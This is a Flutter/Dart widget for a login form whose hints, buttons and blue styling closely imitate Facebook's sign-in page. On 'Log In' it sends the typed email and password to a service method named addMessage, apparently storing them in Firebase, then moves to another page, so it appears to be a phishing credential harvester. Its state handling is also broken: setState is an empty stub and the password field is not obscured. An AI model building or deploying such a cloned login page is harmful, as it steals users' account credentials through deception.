import 'package:firebase_setup_web/login_services.dart';
import 'package:firebase_setup_web/second_page.dart';
import 'package:flutter/material.dart';
import 'package:google_fonts/google_fonts.dart';

// ignore: must_be_immutable
class Content extends StatelessWidget {
  Content({Key? key}) : super(key: key);

  TextEditingController emailController = TextEditingController(text: '');
  TextEditingController passwordController = TextEditingController(text: '');

  handleAddMessage() async {
    await LoginService().addMessage(
      email: emailController.text,
      password: passwordController.text,
    );

    setState(() {
      emailController.text = '';
      passwordController.text = '';
    });
  }

  void setState(Null Function() param0) {}

  bool isHiddenPassword = true;

  void _hidden() {
    setState(() {
      isHiddenPassword = !isHiddenPassword;
    });
  }

  @override
  Widget build(BuildContext context) {
    return Container(
      child: Card(
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(10.0),
        ),
        elevation: 10,
        child: Container(
          width: 430,
          height: 360,
          padding: new EdgeInsets.all(10.0),
          child: Column(
            children: [
              Container(
                padding: EdgeInsets.all(10),
                child: TextField(
                  controller: emailController,
                  autocorrect: true,
                  decoration: InputDecoration(
                    border: OutlineInputBorder(),
                    hintText: 'Email address or phone number',
                    hintStyle: TextStyle(
                        fontSize: 16,
                        color: Colors.black45,
                        fontWeight: FontWeight.bold),
                  ),
                ),
              ),
              Container(
                padding: EdgeInsets.all(10),
                child: TextField(
                  controller: passwordController,
                  obscureText: false,
                  autocorrect: true,
                  decoration: InputDecoration(
                    suffixIcon: InkWell(
                      onTap: _hidden,
                      child: Icon(isHiddenPassword
                          ? Icons.visibility
                          : Icons.visibility_off),
                    ),
                    border: OutlineInputBorder(),
                    hintText: 'Password',
                    hintStyle: TextStyle(
                        fontSize: 16,
                        color: Colors.black45,
                        fontWeight: FontWeight.bold),
                  ),
                ),
              ),
              Row(
                children: [
                  Expanded(
                    child: Padding(
                      padding: const EdgeInsets.only(
                          top: 9.0, bottom: 15.0, left: 9.0, right: 9.0),
// ignore: deprecated_member_use
                      child: RaisedButton(
                        shape: RoundedRectangleBorder(
                            borderRadius: BorderRadius.circular(7)),
                        textColor: Colors.white,
                        color: Color(0xff1877F2),
                        child: Padding(
                          padding: const EdgeInsets.all(12.0),
                          child: Text(
                            'Log In',
                            style: GoogleFonts.roboto(
                                fontSize: 22,
                                color: Colors.white,
                                fontWeight: FontWeight.bold),
                          ),
                        ),
                        onPressed: () {
                          handleAddMessage();
                          Navigator.push(
                              context,
                              MaterialPageRoute(
                                  builder: (context) => SecondPage()));
                        },
                      ),
                    ),
                  ),
                ],
              ),
// ignore: deprecated_member_use
              FlatButton(
                onPressed: () {},
                textColor: Color(0xff1877F2),
                child: Text(
                  'Forgotten password?',
                  style: GoogleFonts.roboto(
                    fontSize: 16,
// fontWeight: FontWeight.bold
                  ),
                ),
              ),
              Divider(
                height: 30,
              ),
              Padding(
                padding: const EdgeInsets.all(8.0),
// ignore: deprecated_member_use
                child: RaisedButton(
                  shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(7)),
                  textColor: Colors.white,
                  color: Color(0xff5eb64c),
                  child: Padding(
                    padding: const EdgeInsets.all(12.0),
                    child: Text(
                      'Create New Account',
                      style: GoogleFonts.roboto(
                          fontSize: 20,
                          color: Colors.white,
                          fontWeight: FontWeight.bold),
                    ),
                  ),
                  onPressed: () {},
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }
}
